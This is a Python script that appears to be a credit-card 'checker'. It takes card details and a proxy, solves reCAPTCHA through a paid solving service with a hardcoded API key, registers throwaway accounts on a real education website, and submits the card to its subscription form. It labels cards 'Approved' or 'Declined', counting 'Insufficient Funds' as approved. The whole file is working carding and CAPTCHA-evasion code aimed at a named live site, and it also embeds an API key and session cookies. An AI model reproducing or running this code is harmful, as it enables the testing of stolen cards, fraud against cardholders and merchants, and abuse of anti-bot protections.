import requests
import uuid
from httpx import AsyncClient
import asyncio
import capsolver

async def vantivccn(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(proxy=proxyg,verify=False) as web:
        capsolver.api_key = "CAP-19CE2290C6A6349E52AE1488B65DCCB7"
            
        g_response = (await asyncio.to_thread(lambda: capsolver.solve({
        "type": "ReCaptchaV2TaskProxyLess",
        "websiteKey": '6Le-xQ0pAAAAAJBgFyLGZsMx68XM2QnOKlyOAshk',
        "websiteURL": 'https://www.lessonplanet.com/pricing',
        })))['gRecaptchaResponse']
                
        email = str(uuid.uuid4()) + '@gmail.com'
        password = str(uuid.uuid4())

        req1 = await web.get('https://www.lessonplanet.com/pricing')

        csrf_token = req1.text.split('name="csrf-token" content="')[1].split('"')[0]

        headers = {
            'accept': '*/*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.lessonplanet.com/pricing',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-csrf-token': csrf_token,
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'plan': '26ba14d52e49907a98dd77b927bcc7fa',
        }

        req2 = await web.get('https://www.lessonplanet.com/subscription/new', params=params, headers=headers)
        form_token = req2.text.split('form_synchronizer_token\\\" value=\\\"')[1].split('\\\"')[0]

        headers = {
            'accept': '*/*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_hp2_ses_props.2502950632=%7B%22r%22%3A%22https%3A%2F%2Fwww.lessonplanet.com%2Fpricing%22%2C%22ts%22%3A1735519566128%2C%22d%22%3A%22www.lessonplanet.com%22%2C%22h%22%3A%22%2Flesson-plans%22%7D; km_vs=1; km_lv=x; _ugeuid=anonymous; km_ai=Aq6nuu7PWDYpvRCs85ajTbh%2BwTU%3D; _hp2_id.2502950632=%7B%22userId%22%3A%227980207638067120%22%2C%22pageviewId%22%3A%223425941094725771%22%2C%22sessionId%22%3A%227239923662746722%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _uetsid=73fb05d0c64711ef9efdbf465f91524f; _uetvid=73fb09d0c64711ef9872db42927c3930; _ga_S0PPDQXNP3=GS1.1.1735519183.2.1.1735519578.47.0.0; kvcd=1735519578522; _ga=GA1.2.443196945.1735514529; _gid=GA1.2.2106394806.1735519621; _gat_UA-214885-1=1; _conv_v=vi%3A1*sc%3A2*cs%3A1735519184*fs%3A1735514595*pv%3A27*exp%3A%7B%7D*ps%3A1735514595; _conv_s=si%3A2*sh%3A1735519184030-0.4186264196268412*pv%3A13; _lessonplanet_prod_session=BbfgipyOKoVQZpwDdtwQr%2BwxsOPWrOZzfbbr1yXBGP2y47J2HTI%2FRxpPHSZhaiQJKaOvqiq3eig5yhI82yXsqT4%2F7ggAnAwVL%2Bk0DitWuuLM5kb%2Fad0Pgejr3wAzsEq1EbG6cx4fN0UEFlxYhA0HZlIIP6dj02qbMhSVOaFXANqZMM8bEb%2BsTqdCfU9tc4V2ncnhN%2FvO5hecg%2BMvcbvLaLes%2B%2FBOXkMJHzkHJlJ%2B1K2fs4WhKNEzl%2FBBOdI%2FTFPv3luedm9LEZyAi6GN1wZPidJ0Mn20QUCTt3%2Brqw87gs8URDflBoRkGN9n--bwzfEKtRjXKv3gnY--A0TJSh%2FRDjBRHlZu8%2FPluQ%3D%3D; ph_phc_82C7xQlwhAJtvPVg5bazuANLB19m4CBJ49Q7i7NScqr_posthog=%7B%22distinct_id%22%3A%2201941507-0100-71c9-b570-4aa97af3f1b1%22%2C%22%24sesid%22%3A%5B1735519661732%2C%2201941507-0122-7ef3-8987-8dff4564eee3%22%2C1735519568162%5D%7D',
            'origin': 'https://www.lessonplanet.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.lessonplanet.com/pricing',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-csrf-token': csrf_token,
            'x-requested-with': 'XMLHttpRequest',
        }

        cc_formatted = ' '.join([cc[i:i+4] for i in range(0, len(cc), 4)])
        exp_date = f"{mes} / {ano}"

        data = {
            'utf8': '✓',
            'new_for_subscription': 'true',
            'user[email]': email,
            'user[password]': password,
            'plan': '26ba14d52e49907a98dd77b927bcc7fa',
            'show_offer_panel': 'true',
            'user[send_communications]': [
                '0',
                '1',
            ],
            'g-recaptcha-response': g_response,
        }


        req3 = await web.post('https://www.lessonplanet.com/user', headers=headers, data=data)
        g_response2 = (await asyncio.to_thread(lambda: capsolver.solve({
        "type": "ReCaptchaV2TaskProxyLess",
        "websiteKey": '6Le-xQ0pAAAAAJBgFyLGZsMx68XM2QnOKlyOAshk',
        "websiteURL": 'https://www.lessonplanet.com/subscription',
        })))['gRecaptchaResponse']
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': '_hp2_ses_props.2502950632=%7B%22r%22%3A%22https%3A%2F%2Fwww.lessonplanet.com%2Fpricing%22%2C%22ts%22%3A1735519566128%2C%22d%22%3A%22www.lessonplanet.com%22%2C%22h%22%3A%22%2Flesson-plans%22%7D; km_vs=1; km_lv=x; _ugeuid=anonymous; km_ai=Aq6nuu7PWDYpvRCs85ajTbh%2BwTU%3D; _hp2_id.2502950632=%7B%22userId%22%3A%227980207638067120%22%2C%22pageviewId%22%3A%223425941094725771%22%2C%22sessionId%22%3A%227239923662746722%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _uetsid=73fb05d0c64711ef9efdbf465f91524f; _uetvid=73fb09d0c64711ef9872db42927c3930; _ga_S0PPDQXNP3=GS1.1.1735519183.2.1.1735519578.47.0.0; kvcd=1735519578522; _ga=GA1.2.443196945.1735514529; _gid=GA1.2.2106394806.1735519621; _conv_v=vi%3A1*sc%3A2*cs%3A1735519184*fs%3A1735514595*pv%3A28*exp%3A%7B%7D*ps%3A1735514595; _conv_s=si%3A2*sh%3A1735519184030-0.4186264196268412*pv%3A14; _gat_UA-214885-1=1; _lessonplanet_prod_session=vJ7U8KtKHu0XbtL8V3NWJdFmSozLOI14%2F7s0jX%2FKGfvzuJV%2FvB1bFW20RvFQAkAOpF6nkgp2LvTi2GvFW%2BwGMMC9Ytzyn1Bj%2FWNzT3VkgKZxS8WO5bPCJRxdNLFTf6KL910YZa04yx2bZXxvAo3B3hLxNxOXt7vFax50lqvAriGaznvtgi8zHSYk8P2BDK6ymBF5nGmL%2B2mipRBFL6m83z6bn2klY4qFVDgwwiOAPyM4LmpHM2ap645QPismSWnKCaaKuR1AQKRaulz%2BPhnFIQvdsH8PRQ9%2BAyoZVvriJdp%2BXgNqHiHKeD9HyAzKCxBhbd4PuwVxTKeilhb6RuEz0dfe4CVZp2LTVcKULuv5F%2FwWa77Hqt6y0%2FTFAsGtDynttjFZcaINiXlZDpLSuMPG3ITUne%2BpHff6Y%2BPJmZKw07%2F1MRyC8r4UZGsLvrr1fR2tcAXcKbg%2FSTtIO%2FmHAtvznYFe7Glh4qIFKMqEojGqZuQc3HGR8PTL979VeiLqPWYGVv0CEj3kRruKoyj%2FCj4d--XzzwRPxAX%2BLo3ar3--lcxfBqQBF4XKZ4odFJrz8w%3D%3D; ph_phc_82C7xQlwhAJtvPVg5bazuANLB19m4CBJ49Q7i7NScqr_posthog=%7B%22distinct_id%22%3A%2201941507-0100-71c9-b570-4aa97af3f1b1%22%2C%22%24sesid%22%3A%5B1735519713623%2C%2201941507-0122-7ef3-8987-8dff4564eee3%22%2C1735519568162%5D%7D',
            'origin': 'https://www.lessonplanet.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.lessonplanet.com/pricing',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            'utf8': '✓',
            'authenticity_token': csrf_token,
            'form_synchronizer_token': form_token,
            'plan': '26ba14d52e49907a98dd77b927bcc7fa',
            'show_offer_panel': 'true',
            'cancellation_option_id': '',
            'notes': '',
            'firstname': 'asd sad a',
            'lastname': 'd asd ',
            'cc_number': cc_formatted,
            'cc_exp_month_yr': exp_date,
            'cc_exp_month': '',
            'cc_exp_yr': '',
            'cc_cvv': '',
            'postal_code': '10010',
            'g-recaptcha-response': g_response2,
        }

        req4 = await web.post('https://www.lessonplanet.com/subscription', headers=headers, data=data)
        with open("vantiv.html", "w", encoding="utf-8") as file:
            file.write(req4.text)
        if "<html><body>You are being <a href=\"https://www.lessonplanet.com/subscription/success\">redirected</a>.</body></html>" in req4.text:
            status = "Approved ✅"
            mensaje = "Approved"
        else:
            mensaje = req4.text.split('There was a problem authorizing your credit card: ')[1].split('.</p>')[0]
            if "Insufficient Funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status, mensaje
